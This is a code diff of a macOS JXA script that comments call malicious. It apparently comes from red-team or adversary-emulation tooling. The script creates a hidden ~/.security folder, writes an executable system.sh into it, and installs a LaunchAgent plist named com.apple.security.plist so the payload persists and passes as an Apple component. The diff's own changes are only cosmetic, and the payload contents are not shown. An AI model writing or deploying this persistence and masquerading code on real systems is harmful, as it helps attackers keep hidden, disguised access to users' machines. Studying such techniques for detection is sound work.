@@ -38,13 +38,15 @@ var app = Application.currentApplication();
 app.includeStandardAdditions = true; 
 
 //Create the hidden directory if it doesn't already exist
-console.log("Creating hidden directory...");
+
 var userHome = app.doShellScript("echo $HOME")
 var hiddenPath = userHome + "/.security"
 isDir=Ref()
 var hiddenDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(hiddenPath,isDir)
-if (hiddenDirectoryExistsCheck == false) {app.doShellScript("mkdir $HOME/.security")
-										}
+if (hiddenDirectoryExistsCheck == false) {
+	console.log("Creating hidden directory...");
+	app.doShellScript("mkdir $HOME/.security")
+					}
 
 //Create the malicious script which is saved to "$HOME/.security/system.sh"
 console.log("Creating malicious script...");
@@ -56,8 +58,9 @@ app.doShellScript("chmod +x $HOME/.security/system.sh");
 //Create user Launch Agent directory if it doesn't already exist
 var lauchagentPath = userHome + "/Library/LaunchAgents"
 var launchDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(lauchagentPath,isDir)
-if (launchDirectoryExistsCheck == false) {app.doShellScript("mkdir $HOME/Library/LaunchAgents")
-										}
+if (launchDirectoryExistsCheck == false) {
+	app.doShellScript("mkdir $HOME/Library/LaunchAgents")
+					}
 //Write the .plist to LaunchAgents
 app.doShellScript("echo" + " " + plist + " " + " > $HOME/Library/LaunchAgents/com.apple.security.plist");
 
